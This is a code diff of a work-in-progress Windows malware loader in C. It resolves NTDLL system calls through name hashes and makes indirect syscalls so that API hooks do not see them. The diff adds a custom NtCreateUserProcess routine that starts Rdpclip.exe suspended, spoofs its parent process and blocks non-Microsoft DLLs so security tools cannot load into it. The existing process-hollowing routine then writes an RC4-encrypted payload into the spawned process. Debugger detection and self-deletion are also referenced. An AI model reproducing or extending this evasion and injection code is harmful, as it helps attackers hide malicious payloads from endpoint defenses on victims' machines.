@@ -18,6 +18,11 @@ typedef struct _VX_TABLE {
     VX_TABLE_ENTRY Write;
     VX_TABLE_ENTRY ResumeThread;
     VX_TABLE_ENTRY QueryInfoProcess;
+    VX_TABLE_ENTRY CreateUserProcess;
+    VX_TABLE_ENTRY CreateProcessParametersEx;
+    VX_TABLE_ENTRY InitUnicodeString;
+    VX_TABLE_ENTRY OpenProcess;
+
 } VX_TABLE, * PVX_TABLE;
     
 //PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
@@ -141,7 +146,7 @@ void printByteArray(const unsigned char* array, size_t size) {
     printf("\n", array);
 }
 
-BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
+BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload, HANDLE hProcess, HANDLE hThread) {
     
     printf("Size payload: %d\n", sPayload);
 
@@ -160,8 +165,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
     gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
-    NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
-
+    //NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    NTSTATUS result = NoahRead3(hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
     printf("NTSTATUS????? %d", result);
     //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
     printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
@@ -196,7 +201,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
     getchar();
     gCurrentSyscall = VxTable.Read.wRCXVal;
-    result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    //result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    result = NoahRead3(hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     getchar();
     printf("Enging NoahRead\n");
     
@@ -212,7 +218,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
     //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
     gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
-    result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    //result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    result = NoahRead3(hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
 
     unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
@@ -235,7 +242,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     gCurrentSyscall = VxTable.Protect.wRCXVal;
     printf("gCurrentSyscall: %d\n", gCurrentSyscall);
     printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
-    result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    result = NoahRead3(hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
     
     
@@ -264,7 +272,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     
     //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
     gCurrentSyscall = VxTable.Write.wRCXVal;
-    result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+   // result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    result = NoahRead3(hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
 
     // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
@@ -283,7 +292,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     //Sw3NtResumeThread(Pi.hThread, &suspendCount);
     gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
-    result = NoahRead3(Pi.hThread, &suspendCount);
+    //result = NoahRead3(Pi.hThread, &suspendCount);
+    result = NoahRead3(hThread, &suspendCount);
     printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
 }
 
@@ -342,10 +352,6 @@ BOOL DeletesSelf() {
 }
 
 
-
-
-
-
 //Also not that this is essentially a custom GetModuleHandle??? 
 void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
     PPEB_LDR_DATA ldr = pPEB->Ldr;
@@ -378,7 +384,6 @@ void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExport
     PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
                                                                         //so we get access to NT headers
 
-
     PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew); 
 
     //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
@@ -409,21 +414,27 @@ void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExport
 
     //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
     // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
+    //BOOL go = TRUE;
     for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
         DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
         PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
-        if (
-            (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
-            ){
-
-            PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
-            PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
-            printf("0x%p : %02X %02X\n",(pbFuncAddress + byteCounter),opcode1,opcode2);
-            pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
-            counter++;
-            byteCounter = 0;
+       // go = TRUE;
+        //I do recognize that due to the lack of while loop we are getting "lucky" per say 
+            if (
+                (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
+                ) {
+                
+                PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
+                PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
+                printf("IS THIS WORKING?????? 0x%p : %02X %02X\n", (pbFuncAddress + byteCounter), opcode1, opcode2);
+                pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
+                counter++;
+                byteCounter = 0;
+                
             }
-        byteCounter++;
+            byteCounter++;
+        
+        
     }
     return TRUE;
     //While we're getting image export directory we can also populate the systemcalls list
@@ -472,9 +483,7 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
             printf("0x%p", syscallTableEntry->pAddress);
             getchar();
             //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
-
-
-
+            // 
            //Now we will search the opcodes for byte sequences relating to system calls!
 
 
@@ -588,17 +597,181 @@ EXTERN_C void UpdateGlobals(DWORD input) {
         getchar();
         return VxTable.QueryInfoProcess.wSystemCall;
     }
+    else if (input == 6) { //CreateUserProcess
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateUserProcess.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.CreateUserProcess.wSystemCall;
+        getchar();
+        return VxTable.CreateUserProcess.wSystemCall;
+    }
+    else if (input == 7) { //CreateProcessPamaeters
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateProcessParametersEx.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.CreateProcessParametersEx.wSystemCall;
+        getchar();
+        return VxTable.CreateProcessParametersEx.wSystemCall;
+    }
+    else if (input == 8) { //InitUNicodeString
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.CreateProcessParametersEx.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.InitUnicodeString.wSystemCall;
+        getchar();
+        return VxTable.InitUnicodeString.wSystemCall;
+    }
     printf("Syscall input not found, check your input in C or RCX\n");
 
 }
 
+//\
+https://offensivedefence.co.uk/posts/ntcreateuserprocess/ <- super helpful resource!
+void customCreateProcess(IN PWSTR procName, IN PWSTR dir, IN PWSTR commandLine, OUT HANDLE* hProceessOut, OUT HANDLE* hThreadOut) {
+    NTSTATUS result;
+
+    // Obtain function pointers from VxTable (assuming they are correctly initialized)
+    fnNtCreateUserProcess NtCreateUserProcess = (fnNtCreateUserProcess)VxTable.CreateUserProcess.pAddress;
+    fnRtlInitUnicodeString RtlCreateProcessParametersEx = (fnRtlInitUnicodeString)VxTable.CreateProcessParametersEx.pAddress;
+    fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)VxTable.InitUnicodeString.pAddress;
+    fnNtOpenProcess NtOpenProcess = (fnNtOpenProcess)VxTable.OpenProcess.pAddress;
+
+    // Define strings
+    UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
+    RtlInitUnicodeString(&NtImagePath, procName);
+    RtlInitUnicodeString(&CurrentDirectory, dir);
+    RtlInitUnicodeString(&CommandLine, commandLine);
+
+    // User process parameters
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+    RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZE);
+
+    // Set process creation flags for suspended state
+    ProcessParameters->Flags |= PROCESS_CREATE_FLAGS_SUSPENDED; // <---- Found the flag from process hacker libs 
+                                                                // https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L1219
+
+    // Initialize attribute list
+    PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE) * 3);
+    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
+
+    // Set image name attribute
+    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    AttributeList->Attributes[0].Size = NtImagePath.Length;
+    AttributeList->Attributes[0].ValuePtr = (ULONG_PTR)NtImagePath.Buffer;
+
+    // Obtain handle to parent process (assuming gCurrentSyscall is correctly set)
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+    CLIENT_ID cid = { (HANDLE)10104, NULL };
+    HANDLE hParent = NULL;
+
+    //This indirect works, its the ones w lots of params that are difficult... but at least this one is good!
+    gCurrentSyscall = VxTable.OpenProcess.wRCXVal;
+    result = NoahRead3(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
+    //result = NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
+    printf("NTSTATUS: %d\n", result);
+
+    // Set parent process attribute
+    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
+    AttributeList->Attributes[1].Size = sizeof(HANDLE);
+    AttributeList->Attributes[1].ValuePtr = hParent;
+
+    // Add process mitigation attribute (example)
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
+    AttributeList->Attributes[2].Size = sizeof(DWORD64);
+    AttributeList->Attributes[2].ValuePtr = &policy;
+
+    // process create info
+    PS_CREATE_INFO CreateInfo = { 0 };
+    CreateInfo.Size = sizeof(CreateInfo);
+    CreateInfo.State = PsCreateInitialState;
+
+    // Spawn process
+    HANDLE hProcess, hThread = NULL;
+    //This works.
+    result = NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
+   
+    //TODO: fix this one
+    // result = NoahRead3(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, &AttributeList);
+    *hProceessOut = hProcess;
+    *hThreadOut = hThread;
+
+    // Free allocated memory
+    HeapFree(GetProcessHeap(), 0, AttributeList);
+
+    // Cleanup process parameters structure if needed
+    // RtlDestroyProcessParameters(ProcessParameters);
+
+
+}
 int main() {
 
     initializeSystemCalls();
 
+    //shifted this up so we can run our new createproc
+    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
+    //Read from GS register at 0x30 offset for TEB
+    //Using TEB we can find PEB
+    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
+    PVOID pNtdllBase = NULL;
+    printf("Getting base...\n");
+
+
+    GetBase(pCurrentPEB, &pNtdllBase);
+    printf("NTDLL Base: 0x%p\n", pNtdllBase);
+    getchar();
+
+    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
+    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
+    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
+    GetImageExportDir(pNtdllBase, &ppImageExportDirectory, &dwDLLSize);
+    printf("DLL Size (bytes): %d", dwDLLSize);
+
+
     STARTUPINFOA Si = { 0 };
     PROCESS_INFORMATION Pi = { 0 };
     BOOL success = FALSE;
+
+    PWSTR procName = L"\\??\\C:\\Windows\\System32\\Rdpclip.exe"; // should probably hash this too
+    PWSTR dir = L"C:\\Windows\\System32";
+    PWSTR commandLine = L"\"C:\\Windows\\System32\\Rdpclip.exe\"";
+    VX_TABLE_ENTRY CreateUserProcess = { 0 };
+    VX_TABLE_ENTRY CreateProcessParameters = { 0 };
+    VX_TABLE_ENTRY InitUnicodeString = { 0 };
+    VX_TABLE_ENTRY OpenProcess = { 0 };
+
+    
+
+    VxTable.CreateUserProcess = CreateUserProcess;
+    VxTable.CreateUserProcess.dwHash = strtoull("01E99E27", NULL, 16);
+
+    VxTable.CreateProcessParametersEx = CreateProcessParameters;
+    VxTable.CreateProcessParametersEx.dwHash = strtoull("FA96CFC9", NULL, 16);
+
+
+    VxTable.InitUnicodeString = InitUnicodeString;
+    VxTable.InitUnicodeString.dwHash = strtoull("0A95CC97", NULL, 16);
+
+    VxTable.OpenProcess = OpenProcess;
+    VxTable.OpenProcess.dwHash = strtoull("10029746", NULL, 16);
+
+    VxTable.CreateUserProcess.wRCXVal = 6;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateUserProcess);
+    
+    VxTable.CreateProcessParametersEx.wRCXVal = 7;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateProcessParametersEx);
+
+    VxTable.InitUnicodeString.wRCXVal = 8;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.InitUnicodeString);
+
+
+    VxTable.InitUnicodeString.wRCXVal = 9;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.OpenProcess);
+
+
+
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    customCreateProcess(procName, dir, commandLine, &hProcess, &hThread); // ntcreateuserprocess w/ DLL block policy 
+    /*
     success = CreateProcessA("C:\\Windows\\System32\\Rdpclip.exe", NULL,
         NULL, //p handle cannot be inheritied by child process
         NULL, //thread handle cannot be inheritied yb child since NULL
@@ -609,27 +782,13 @@ int main() {
         &Si,
         &Pi
     );
-
-    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
-                                                    //Read from GS register at 0x30 offset for TEB
-                                                    //Using TEB we can find PEB
-    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
-    PVOID pNtdllBase = NULL;
-    printf("Getting base...\n");
-
+    */
+    
 
     //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
     //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
 
-    GetBase(pCurrentPEB, &pNtdllBase);
-    printf("NTDLL Base: 0x%p\n", pNtdllBase);
-    getchar();
 
-    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
-    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
-    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
-    GetImageExportDir(pNtdllBase,&ppImageExportDirectory,&dwDLLSize);
-    printf("DLL Size (bytes): %d", dwDLLSize);
 
     VX_TABLE_ENTRY Write = { 0 };
     VX_TABLE_ENTRY Read = { 0 };
@@ -637,6 +796,7 @@ int main() {
     VX_TABLE_ENTRY Protect = {0};
     VX_TABLE_ENTRY ResumeThread = { 0 };
     VX_TABLE_ENTRY QueryInfoProcess = { 0 };
+
 
     //Hashes retrieved from Hasher code
     VxTable.Write = Write;
@@ -658,6 +818,7 @@ int main() {
     VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);
 
 
+
     printf("0x%0.8X\n", VxTable.Protect.dwHash);
 
     printf("Struct populated...\n");
@@ -667,6 +828,8 @@ int main() {
 
     // i wish there was a way to pass the entire struct and then loop through this
 
+
+    //i love all functions equally, but this one is defintely up there.
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
     VxTable.Read.wRCXVal = 0;
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
@@ -679,6 +842,7 @@ int main() {
     VxTable.ResumeThread.wRCXVal = 4;
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
     VxTable.QueryInfoProcess.wRCXVal = 5;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.CreateUserProcess);
 
     detectDebug();
 
@@ -688,7 +852,7 @@ int main() {
 
 
     getchar();
-    hollowProcess(Pi, sizeof(Rc4CipherText));
+    hollowProcess(Pi, sizeof(Rc4CipherText),hProcess,hThread);
 
 
     getchar();
